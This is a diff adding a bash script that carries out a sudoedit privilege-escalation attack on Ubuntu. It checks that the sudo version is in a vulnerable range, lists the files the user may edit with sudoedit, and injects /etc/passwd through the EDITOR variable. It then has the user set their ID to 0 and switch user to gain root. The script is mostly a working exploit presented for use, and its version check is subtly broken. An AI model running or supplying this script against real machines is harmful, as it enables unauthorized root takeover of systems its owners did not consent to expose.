@@ -1,0 +1,114 @@
+#!/bin/bash
+
+# Function to compare version numbers
+version_compare() {
+    local v1="${1//[^0-9]/}"
+    local v2="${2//[^0-9]/}"
+    ((10#$v1 > 10#$v2)) && return 1
+    ((10#$v1 < 10#$v2)) && return 2
+    return 0
+}
+
+# Step 1: Checking the user and user id
+echo -e "Step 1: Checking the user and user ID\n"
+whoami
+id
+sleep 2
+
+# Step 2: Checking the Ubuntu version
+echo -e "Step 2: Checking the Ubuntu version\n"
+lsb_release -a
+sleep 2
+
+# Step 3: Checking the sudo version
+echo -e "Step 3: Checking the sudo version\n"
+SUDO_VERSION=$(sudo --version | head -n 1 | awk '{print $3}')
+echo "Sudo version: $SUDO_VERSION"
+sleep 2
+
+# Step 4: Check if the sudo version is between 1.8.0 and 1.9.12p1
+echo -e "Step 4: Check if the sudo version is between 1.8.0 and 1.9.12p1\n"
+MIN_VERSION="1.8.0"
+MAX_VERSION="1.9.12p1"
+
+version_compare "$SUDO_VERSION" "$MIN_VERSION"
+[[ $? == 2 ]] && echo "Sudo version is less than $MIN_VERSION. Exiting..." && exit 1
+
+version_compare "$SUDO_VERSION" "$MAX_VERSION"
+[[ $? == 1 ]] && echo "Sudo version is greater than $MAX_VERSION. Exiting..." && exit 1
+
+echo "Sudo version is within the specified range."
+sleep 2
+
+# Step 5: Checking for user permissions
+echo -e "Step 5: Checking for user permissions\n"
+SUDO_L_OUTPUT=$(sudo -l)
+echo "sudo -l output:"
+echo "$SUDO_L_OUTPUT"
+sleep 2
+
+FILES=$(echo "$SUDO_L_OUTPUT" | grep -E 'sudoedit\s' | awk '{print $NF}')
+[[ -z "$FILES" ]] && echo "You do not have permission to edit any files. Exiting..." && exit 1
+
+echo "Files you have permission to edit:"
+echo "$FILES"
+sleep 2
+
+# Step 6: Manual Instructions
+echo -e "Step 6: Please select a file from the list above to edit.\n"
+echo "Enter the filename:"
+read FILENAME
+sleep 2
+
+# Check if the selected file is in the list of permitted files
+[[ ! "$FILES" =~ "$FILENAME" ]] && echo "Invalid file selection. Exiting..." && exit 1
+
+# Step 7: Editing the selected file using sudoedit
+echo -e "Step 7: Editing $FILENAME using sudoedit\n"
+sudoedit "$FILENAME"
+sleep 2
+
+# Step 8: Display the contents of /etc/passwd
+echo -e "Step 8: Displaying the contents of /etc/passwd\n"
+cat /etc/passwd
+sleep 2
+
+# Step 9: Export EDITOR with vim to edit /etc/passwd
+echo -e "Step 9: Setting EDITOR environment variable\n"
+export EDITOR="vim -- /etc/passwd"
+sleep 2
+
+# Step 10: Manual Instructions
+echo "Please select a file from the list above to edit."
+echo "Enter the filename:"
+read FILENAME
+sleep 2
+
+# Check if the selected file is in the list of permitted files
+[[ ! "$FILES" =~ "$FILENAME" ]] && echo "Invalid file selection. Exiting..." && exit 1
+
+echo -e "Editing $FILENAME using sudoedit\n"
+sudoedit "$FILENAME"
+sleep 2
+
+# Wait for user input to continue
+read -r
+
+# User manually changes the current user's ID to 0 here
+
+# Step 11: Checking whether ID has changed or not
+echo -e "Step 11: Checking whether ID has changed\n"
+cat /etc/passwd
+sleep 2
+
+# Step 12: Switching user to the specified username
+echo "Step 12: Enter the username to switch to:"
+read USERNAME
+sleep 2
+
+echo -e "Step 12: Switching user to $USERNAME\n"
+su - "$USERNAME"
+
+# Add a final prompt to keep the terminal open
+echo "Press [Enter] key to close the terminal..."
+read -r
